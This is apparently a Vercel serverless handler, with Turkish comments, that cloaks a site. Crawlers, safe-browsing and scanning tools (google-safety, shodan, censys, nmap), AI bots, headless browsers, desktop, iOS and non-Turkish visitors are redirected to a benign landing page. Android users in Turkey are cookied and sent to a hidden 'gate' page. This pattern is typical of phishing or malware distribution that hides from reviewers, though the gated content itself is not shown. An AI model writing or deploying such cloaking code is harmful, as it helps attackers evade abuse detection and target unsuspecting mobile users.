export default function handler(req, res) {
    const ua = (req.headers['user-agent'] || '');
    const uaLower = ua.toLowerCase();
    const cookies = req.headers.cookie || '';
    const hasCookie = cookies.includes('_src=1');
    const country = req.headers['x-vercel-ip-country'] || '';
    const referer = req.headers['referer'] || '';

    // Bot / crawler tespiti - geniş liste
    const botPatterns = [
        'facebookexternalhit','facebot','facebookcatalog',
        'instagram','linkedinbot','twitterbot','whatsapp',
        'telegrambot','googlebot','google-inspectiontool',
        'google-safety','storebot-google','bingbot','yandexbot',
        'baiduspider','crawler','spider','slurp','preview',
        'headlesschrome','phantomjs','selenium','webdriver',
        'puppeteer','playwright','curl','wget','python-requests',
        'python/','go-http-client','java/','libwww','zgrab',
        'nmap','masscan','shodan','censys','dataforseo',
        'ahrefsbot','semrushbot','mj12bot','dotbot','petalbot',
        'bytespider','gptbot','claudebot','anthropic','applebot',
        'duckduckbot','exabot','ia_archiver','libredtail','axios',
        'node-fetch','okhttp/','httpx','scrapy','requests/',
        'facebookbot','meta-externalagent','adsbot-google',
        'mediapartners-google','apis-google','adidxbot',
        'bingpreview','msnbot','tiktokbot','snapchat',
        'pinterestbot','redditbot','discordbot','slackbot',
        'viber','line/','kakaotalk','naver','daum',
        'archive.org','wayback','screaming frog',
        'similar','majestic','moz.com','rogerbot'
    ];
    const isBot = botPatterns.some(p => uaLower.includes(p));

    // Boş veya çok kısa UA
    const isEmptyUA = ua.length < 10;

    // Headless browser
    const isHeadless = uaLower.includes('headless') ||
                       uaLower.includes('phantom') ||
                       uaLower.includes('electron');

    // Türkiye değil
    const isNotTurkey = country !== 'TR';

    // Android değil (UA kontrolü - ilk katman)
    const isAndroid = uaLower.includes('android');
    const isWindows = uaLower.includes('windows');
    const isMacOS = uaLower.includes('macintosh') || uaLower.includes('mac os x');
    const isLinux = uaLower.includes('x11') || (uaLower.includes('linux') && !isAndroid);
    const isIOS = uaLower.includes('iphone') || uaLower.includes('ipad');
    const isDesktop = isWindows || isMacOS || isLinux;

    if (isBot || isEmptyUA || isHeadless || isNotTurkey || isDesktop || isIOS) {
        res.setHeader('Location', '/landing.html');
        res.status(302).end();
        return;
    }

    if (hasCookie) {
        res.setHeader('Location', '/index.html');
        res.status(302).end();
        return;
    }

    // TR + Android + gerçek kullanıcı → gate'e gönder (JS doğrulama)
    res.setHeader('Set-Cookie', '_src=1; Path=/; Max-Age=604800; SameSite=Lax');
    res.setHeader('Location', '/gate.html');
    res.status(302).end();
}
